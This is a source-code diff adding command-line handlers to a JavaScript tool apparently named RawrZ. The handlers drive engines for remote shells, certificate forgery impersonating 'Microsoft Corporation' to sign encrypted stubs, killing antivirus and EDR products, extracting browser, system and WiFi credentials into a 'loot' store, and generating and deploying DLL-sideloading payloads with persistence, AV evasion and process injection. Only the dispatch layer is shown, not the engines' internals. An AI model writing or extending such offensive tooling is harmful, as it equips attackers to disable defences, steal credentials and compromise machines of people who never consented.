+                    const timeout = timeoutArg ? parseInt(timeoutArg.split('=')[1]) : 300000;
+                    const autoReset = autoResetArg ? autoResetArg.split('=')[1] === 'true' : false;
+                    
+                    this.enableIdleTimeout(timeout, autoReset);
+                    console.log(`[OK] Idle timeout enabled: ${timeout}ms, auto-reset: ${autoReset}`);
+                    return { success: true, timeout, autoReset };
+                    
+                case 'disable':
+                    this.disableIdleTimeout();
+                    console.log('[OK] Idle timeout disabled');
+                    return { success: true };
+                    
+                case 'status':
+                    const status = {
+                        enabled: this.idleTimeoutEnabled,
+                        timeout: this.idleTimeoutMs,
+                        autoReset: this.autoResetOnIdle,
+                        freezeDetection: this.freezeDetectionEnabled,
+                        freezeTimeout: this.freezeTimeoutMs,
+                        lastActivity: this.lastActivity,
+                        commandInProgress: this.commandInProgress
+                    };
+                    console.log('[OK] Idle timeout status:');
+                    console.log(`[INFO] Enabled: ${status.enabled}`);
+                    console.log(`[INFO] Timeout: ${status.timeout}ms`);
+                    console.log(`[INFO] Auto-reset: ${status.autoReset}`);
+                    console.log(`[INFO] Freeze detection: ${status.freezeDetection}`);
+                    console.log(`[INFO] Freeze timeout: ${status.freezeTimeout}ms`);
+                    console.log(`[INFO] Command in progress: ${status.commandInProgress}`);
+                    return { success: true, status };
+                    
+                case 'reset':
+                    this.resetCLI();
+                    console.log('[OK] CLI reset via idle command');
+                    return { success: true };
+                    
+                default:
+                    console.log(`[ERROR] Unknown idle action: ${action}`);
+                    console.log('[INFO] Available actions: enable, disable, status, reset');
+                    return { success: false, error: 'Unknown action' };
+            }
+        } catch (error) {
+            console.log(`[ERROR] Idle command failed: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    // Red Shells CLI Command Handler
+    async redShellsCommand(action, args) {
+        try {
+            const redShells = require('./src/engines/red-shells');
+            
+            switch (action) {
+                case 'create':
+                    const typeArg = args.find(arg => arg.startsWith('--type='));
+                    const shellType = typeArg ? typeArg.split('=')[1] : 'powershell';
+                    console.log(`[Red Shells] Creating ${shellType} shell...`);
+                    const shell = await redShells.createRedShell(shellType);
+                    console.log(`[Red Shells] Shell created: ${shell.id}`);
+                    return { success: true, shell };
+                    
+                case 'execute':
+                    const idArg = args.find(arg => arg.startsWith('--id='));
+                    const cmdArg = args.find(arg => arg.startsWith('--command='));
+                    if (!idArg || !cmdArg) {
+                        console.log('[ERROR] --id=<shellId> and --command=<cmd> are required for execute');
+                        return;
+                    }
+                    const shellId = idArg.split('=')[1];
+                    const command = cmdArg.split('=')[1];
+                    console.log(`[Red Shells] Executing command in shell ${shellId}...`);
+                    const result = await redShells.executeCommand(shellId, command);
+                    console.log(`[Red Shells] Command result: ${result.output}`);
+                    return { success: true, result };
+                    
+                case 'list':
+                    console.log('[Red Shells] Listing active shells...');
+                    const shells = await redShells.getActiveShells();
+                    console.log(`[Red Shells] Found ${shells.length} active shells`);
+                    shells.forEach(shell => {
+                        console.log(`  - ${shell.id} (${shell.type}) - ${shell.status}`);
+                    });
+                    return { success: true, shells };
+                    
+                case 'history':
+                    const historyIdArg = args.find(arg => arg.startsWith('--id='));
+                    if (!historyIdArg) {
+                        console.log('[ERROR] --id=<shellId> is required for history');
+                        return;
+                    }
+                    const historyShellId = historyIdArg.split('=')[1];
+                    console.log(`[Red Shells] Getting history for shell ${historyShellId}...`);
+                    const history = await redShells.getShellHistory(historyShellId);
+                    console.log(`[Red Shells] History: ${history.length} entries`);
+                    history.forEach(entry => {
+                        console.log(`  [${entry.type}] ${entry.data.substring(0, 100)}...`);
+                    });
+                    return { success: true, history };
+                    
+                case 'terminate':
+                    const terminateIdArg = args.find(arg => arg.startsWith('--id='));
+                    if (!terminateIdArg) {
+                        console.log('[ERROR] --id=<shellId> is required for terminate');
+                        return;
+                    }
+                    const terminateShellId = terminateIdArg.split('=')[1];
+                    console.log(`[Red Shells] Terminating shell ${terminateShellId}...`);
+                    const terminated = await redShells.terminateShell(terminateShellId);
+                    console.log(`[Red Shells] Shell terminated: ${terminated}`);
+                    return { success: true, terminated };
+                    
+                case 'status':
+                    console.log('[Red Shells] Getting system status...');
+                    const status = await redShells.getStatus();
+                    console.log(`[Red Shells] Status: ${status.activeShells} active shells, Red Killer: ${status.redKillerEnabled}, EV Cert: ${status.evCertEnabled}`);
+                    return { success: true, status };
+                    
+                case 'stats':
+                    console.log('[Red Shells] Getting shell statistics...');
+                    const stats = await redShells.getShellStats();
+                    console.log(`[Red Shells] Stats: ${stats.totalShells} total, ${stats.activeShells} active, ${stats.totalCommands} commands executed`);
+                    return { success: true, stats };
+                    
+                default:
+                    console.log(`[ERROR] Unknown Red Shells action: ${action}`);
+                    console.log('[INFO] Available actions: create, execute, list, history, terminate, status, stats');
+                    return;
+            }
+        } catch (error) {
+            console.log(`[ERROR] Red Shells command failed: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    // EV Certificate CLI Command Handler
+    async evCertCommand(action, args) {
+        try {
+            const EVCertEncryptor = require('./src/engines/ev-cert-encryptor');
+            const evCertEncryptor = new EVCertEncryptor();
+            
+            switch (action) {
+                case 'generate':
+                    const templateArg = args.find(arg => arg.startsWith('--template='));
+                    const template = templateArg ? templateArg.split('=')[1] : 'Microsoft Corporation';
+                    console.log(`[EV Cert] Generating EV certificate with template: ${template}`);
+                    const certId = await evCertEncryptor.generateEVCertificate(template);
+                    console.log(`[EV Cert] Certificate generated: ${certId}`);
+                    return { success: true, certId };
+                    
+                case 'encrypt-stub':
+                    const stubCodeArg = args.find(arg => arg.startsWith('--stub-code='));
+                    const languageArg = args.find(arg => arg.startsWith('--language='));
+                    const certIdArg = args.find(arg => arg.startsWith('--cert-id='));
+                    
+                    if (!stubCodeArg || !languageArg || !certIdArg) {
+                        console.log('[ERROR] --stub-code, --language, and --cert-id are required for encrypt-stub');
+                        return;
+                    }
+                    
+                    const stubCode = stubCodeArg.split('=')[1];
+                    const language = languageArg.split('=')[1];
+                    const certIdForStub = certIdArg.split('=')[1];
+                    
+                    console.log(`[EV Cert] Encrypting ${language} stub with certificate ${certIdForStub}`);
+                    const encryptedStub = await evCertEncryptor.encryptStubWithEVCert(stubCode, language, certIdForStub);
+                    console.log(`[EV Cert] Stub encrypted: ${encryptedStub.stubId}`);
+                    return { success: true, encryptedStub };
+                    
+                case 'list-certs':
+                    console.log('[EV Cert] Listing certificates...');
+                    const certificates = await evCertEncryptor.getCertificates();
+                    console.log(`[EV Cert] Found ${certificates.length} certificates`);
+                    certificates.forEach(cert => {
+                        console.log(`  - ${cert.id}: ${cert.template} (${cert.algorithm})`);
+                    });
+                    return { success: true, certificates };
+                    
+                case 'list-stubs':
+                    console.log('[EV Cert] Listing encrypted stubs...');
+                    const stubs = await evCertEncryptor.getEncryptedStubs();
+                    console.log(`[EV Cert] Found ${stubs.length} encrypted stubs`);
+                    stubs.forEach(stub => {
+                        console.log(`  - ${stub.stubId}: ${stub.language} (${stub.algorithm})`);
+                    });
+                    return { success: true, stubs };
+                    
+                case 'templates':
+                    console.log('[EV Cert] Getting supported templates...');
+                    const templates = await evCertEncryptor.getSupportedTemplates();
+                    console.log(`[EV Cert] Available templates: ${templates.join(', ')}`);
+                    return { success: true, templates };
+                    
+                case 'languages':
+                    console.log('[EV Cert] Getting supported languages...');
+                    const languages = await evCertEncryptor.getSupportedLanguages();
+                    console.log(`[EV Cert] Available languages: ${languages.join(', ')}`);
+                    return { success: true, languages };
+                    
+                case 'algorithms':
+                    console.log('[EV Cert] Getting supported algorithms...');
+                    const algorithms = await evCertEncryptor.getSupportedAlgorithms();
+                    console.log(`[EV Cert] Available algorithms: ${algorithms.join(', ')}`);
+                    return { success: true, algorithms };
+                    
+                default:
+                    console.log(`[ERROR] Unknown EV Cert action: ${action}`);
+                    console.log('[INFO] Available actions: generate, encrypt-stub, list-certs, list-stubs, templates, languages, algorithms');
+                    return;
+            }
+        } catch (error) {
+            console.log(`[ERROR] EV Cert command failed: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    // Red Killer CLI Command Handler
+    async redKillerCommand(action, args) {
+        try {
+            const redKiller = require('./src/engines/red-killer');
+            
+            switch (action) {
+                case 'detect':
+                    console.log('[Red Killer] Detecting AV/EDR systems...');
+                    const detected = await redKiller.detectAVEDR();
+                    console.log(`[Red Killer] Detected ${detected.length} systems: ${detected.join(', ')}`);
+                    return { success: true, detected };
+                    
+                case 'execute':
+                    const systemsArg = args.find(arg => arg.startsWith('--systems='));
+                    const systems = systemsArg ? systemsArg.split('=')[1].split(',') : [];
+                    console.log(`[Red Killer] Executing termination on systems: ${systems.join(', ')}`);
+                    const result = await redKiller.executeRedKiller(systems);
+                    console.log(`[Red Killer] Termination result: ${result.success ? 'Success' : 'Failed'}`);
+                    return { success: true, result };
+                    
+                case 'extract':
+                    const targetsArg = args.find(arg => arg.startsWith('--targets='));
+                    const targets = targetsArg ? targetsArg.split('=')[1].split(',') : ['browser', 'system', 'credentials'];
+                    console.log(`[Red Killer] Extracting data from targets: ${targets.join(', ')}`);
+                    const extracted = await redKiller.extractData(targets);
+                    console.log(`[Red Killer] Data extraction completed: ${extracted.success ? 'Success' : 'Failed'}`);
+                    return { success: true, extracted };
+                    
+                case 'wifi-dump':
+                    console.log('[Red Killer] Dumping WiFi credentials...');
+                    const wifiResult = await redKiller.dumpWiFiCredentials();
+                    console.log(`[Red Killer] WiFi dump completed: ${wifiResult.success ? 'Success' : 'Failed'}`);
+                    return { success: true, wifiResult };
+                    
+                case 'loot':
+                    console.log('[Red Killer] Getting loot container...');
+                    const loot = await redKiller.getLootContainer();
+                    console.log(`[Red Killer] Found ${loot.length} loot items`);
+                    return { success: true, loot };
+                    
+                case 'kills':
+                    console.log('[Red Killer] Getting kill statistics...');
+                    const kills = await redKiller.getKillStats();
+                    console.log(`[Red Killer] Kill stats: ${kills.totalKills} total kills`);
+                    return { success: true, kills };
+                    
+                case 'patterns':
+                    console.log('[Red Killer] Getting AV patterns...');
+                    const patterns = redKiller.avPatterns || {};
+                    console.log(`[Red Killer] Available AV patterns: ${Object.keys(patterns).join(', ')}`);
+                    return { success: true, patterns };
+                    
+                default:
+                    console.log(`[ERROR] Unknown Red Killer action: ${action}`);
+                    console.log('[INFO] Available actions: detect, execute, extract, wifi-dump, loot, kills, patterns');
+                    return;
+            }
+        } catch (error) {
+            console.log(`[ERROR] Red Killer command failed: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    // Beaconism DLL Sideloading CLI Command Handler
+    async beaconismCommand(action, args) {
+        try {
+            const beaconism = require('./src/engines/beaconism-dll-sideloading');
+            
+            switch (action) {
+                case 'generate':
+                    const options = this.parseBeaconismOptions(args);
+                    console.log('[Beaconism] Generating payload...');
+                    const payload = await beaconism.generatePayload(options);
+                    console.log(`[Beaconism] Payload generated: ${payload.id}`);
+                    console.log(`[Beaconism] Architecture: ${payload.architecture}`);
+                    console.log(`[Beaconism] Target: ${payload.target}`);
+                    console.log(`[Beaconism] Encryption: ${payload.encryption}`);
+                    return { success: true, payload };
+                    
+                case 'deploy':
+                    if (args.length < 2) {
+                        console.log('[ERROR] Usage: beaconism deploy <payloadId> <targetPath> [options]');
+                        return;
+                    }
+                    const payloadId = args[0];
+                    const targetPath = args[1];
+                    const deployOptions = this.parseDeployOptions(args.slice(2));
+                    console.log(`[Beaconism] Deploying payload ${payloadId} to ${targetPath}...`);
+                    const deployResult = await beaconism.deployPayload(payloadId, targetPath, deployOptions);
+                    console.log(`[Beaconism] Deployment successful: ${deployResult.success}`);
+                    return { success: true, deployResult };
+                    
+                case 'list':
+                    console.log('[Beaconism] Listing active payloads...');
+                    const payloads = await beaconism.listPayloads();
+                    console.log(`[Beaconism] Found ${payloads.length} active payloads:`);
+                    payloads.forEach(payload => {
+                        console.log(`  - ${payload.id}: ${payload.status} (${payload.architecture}, ${payload.target})`);
+                    });
+                    return { success: true, payloads };
+                    
+                case 'status':
+                    if (args.length < 1) {
+                        console.log('[ERROR] Usage: beaconism status <payloadId>');
+                        return;
+                    }
+                    const statusPayloadId = args[0];
+                    console.log(`[Beaconism] Getting status for payload ${statusPayloadId}...`);
+                    const status = await beaconism.getPayloadStatus(statusPayloadId);
+                    if (status.found) {
+                        console.log(`[Beaconism] Payload Status:`);
+                        console.log(`  - ID: ${status.id}`);
+                        console.log(`  - Status: ${status.status}`);
+                        console.log(`  - Architecture: ${status.architecture}`);
+                        console.log(`  - Target: ${status.target}`);
+                        console.log(`  - Timestamp: ${status.timestamp}`);
+                        if (status.deploymentPath) {
+                            console.log(`  - Deployment Path: ${status.deploymentPath}`);
+                            console.log(`  - Deployment Time: ${status.deploymentTime}`);
+                        }
+                        if (status.error) {
+                            console.log(`  - Error: ${status.error}`);
+                        }
+                    } else {
+                        console.log(`[Beaconism] Payload not found: ${statusPayloadId}`);
+                    }
+                    return { success: true, status };
+                    
+                case 'stats':
+                    console.log('[Beaconism] Getting statistics...');
+                    const stats = await beaconism.getStatistics();
+                    console.log(`[Beaconism] Statistics:`);
+                    console.log(`  - Total Payloads: ${stats.totalPayloads}`);
+                    console.log(`  - Successful Deployments: ${stats.successfulDeployments}`);
+                    console.log(`  - Failed Deployments: ${stats.failedDeployments}`);
+                    console.log(`  - AV Detections: ${stats.avDetections}`);
+                    console.log(`  - Persistence Installs: ${stats.persistenceInstalls}`);
+                    console.log(`  - Active Payloads: ${stats.activePayloads}`);
+                    console.log(`  - Available Targets: ${stats.availableTargets}`);
+                    console.log(`  - Available Architectures: ${stats.availableArchitectures}`);
+                    console.log(`  - Available Encryption Methods: ${stats.availableEncryptionMethods}`);
+                    console.log(`  - Available Exploit Vectors: ${stats.availableExploitVectors}`);
+                    console.log(`  - Available Persistence Methods: ${stats.availablePersistenceMethods}`);
+                    console.log(`  - Available AV Evasion Techniques: ${stats.availableAVEvasionTechniques}`);
+                    console.log(`  - Available Process Injection Methods: ${stats.availableProcessInjectionMethods}`);
+                    return { success: true, stats };
+                    
+                case 'targets':
+                    console.log('[Beaconism] Available DLL Sideloading targets:');
+                    const targets = beaconism.sideloadTargets;
+                    Object.entries(targets).forEach(([name, config]) => {
+                        console.log(`  - ${name}: ${config.description}`);
+                        console.log(`    DLL: ${config.dllName}`);
+                        console.log(`    Vector: ${config.exploitVector}`);
+                    });
+                    return { success: true, targets };
+                    
+                case 'architectures':
+                    console.log('[Beaconism] Available architectures:');
+                    const architectures = beaconism.architectures;
+                    Object.entries(architectures).forEach(([name, config]) => {
+                        console.log(`  - ${name}: ${config.name} (${config.dotnet ? '.NET' : 'Native'})`);
+                    });
+                    return { success: true, architectures };
+                    
+                case 'persistence':
+                    console.log('[Beaconism] Available persistence methods:');
+                    const persistenceMethods = beaconism.persistenceMethods;
+                    persistenceMethods.forEach((config, name) => {
+                        console.log(`  - ${name}: ${config.name} (Stealth: ${config.stealth})`);
+                        console.log(`    Description: ${config.description}`);
+                    });
+                    return { success: true, persistenceMethods };
+                    
+                case 'platforms':
+                    console.log('[Beaconism] Supported platforms:');
+                    const platforms = ['windows', 'macos', 'linux', 'android', 'ios', 'cross-platform'];
+                    platforms.forEach(platform => {
+                        const count = Object.values(beaconism.sideloadTargets).filter(target => target.platform === platform).length;
+                        console.log(`  - ${platform}: ${count} targets available`);
+                    });
+                    return { success: true, platforms };
+                    
+                case 'vectors':
+                    console.log('[Beaconism] Available exploit vectors by platform:');
+                    const vectorsByPlatform = {};
+                    Object.entries(beaconism.exploitVectors).forEach(([ext, config]) => {
+                        if (!vectorsByPlatform[config.platform]) {
+                            vectorsByPlatform[config.platform] = [];
+                        }
+                        vectorsByPlatform[config.platform].push({ ext, ...config });
+                    });
+                    
+                    Object.entries(vectorsByPlatform).forEach(([platform, vectors]) => {
+                        console.log(`  ${platform.toUpperCase()}:`);
+                        vectors.forEach(vector => {
+                            console.log(`    - ${vector.ext}: ${vector.description} (${vector.method})`);
+                        });
+                    });
+                    return { success: true, vectorsByPlatform };
+                    
+                default:
+                    console.log(`[ERROR] Unknown Beaconism action: ${action}`);
+                    console.log('[INFO] Available actions: generate, deploy, list, status, stats, targets, architectures, persistence, platforms, vectors');
+                    return;
+            }
+        } catch (error) {
+            console.log(`[ERROR] Beaconism command failed: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    parseBeaconismOptions(args) {
+        const options = {};
+        
+        for (const arg of args) {
+            if (arg.startsWith('--architecture=')) {
+                options.architecture = arg.split('=')[1];
+            } else if (arg.startsWith('--encryption=')) {
+                options.encryption = arg.split('=')[1];
+            } else if (arg.startsWith('--target=')) {
+                options.target = arg.split('=')[1];
+            } else if (arg.startsWith('--exploit-vector=')) {
+                options.exploitVector = arg.split('=')[1];
+            } else if (arg === '--no-beaconism') {
+                options.beaconism = false;
+            } else if (arg === '--no-persistence') {
+                options.persistence = false;
+            } else if (arg.startsWith('--av-evasion=')) {
+                options.avEvasion = arg.split('=')[1].split(',');
+            }
+        }
+        
+        return options;
+    }
+
+    parseDeployOptions(args) {
+        const options = {};
+        
+        for (const arg of args) {
+            if (arg === '--no-av-scan') {
+                options.avScan = false;
+            } else if (arg === '--no-persistence') {
+                options.persistence = false;
+            } else if (arg.startsWith('--persistence-method=')) {
+                options.persistenceMethod = arg.split('=')[1];
+            }
+        }
+        
+        return options;
     }
 }
 
@@ -4425,7 +5147,7 @@ async function main() {
     const args = process.argv.slice(2);
     
     // Use singleton pattern to maintain engine state across commands
-    const rawrz = RawrZStandalone.getInstance();
+    const rawrz = await RawrZStandalone.getInstanceAsync();
     
     if (args.length === 0) {
         rawrz.showHelp();
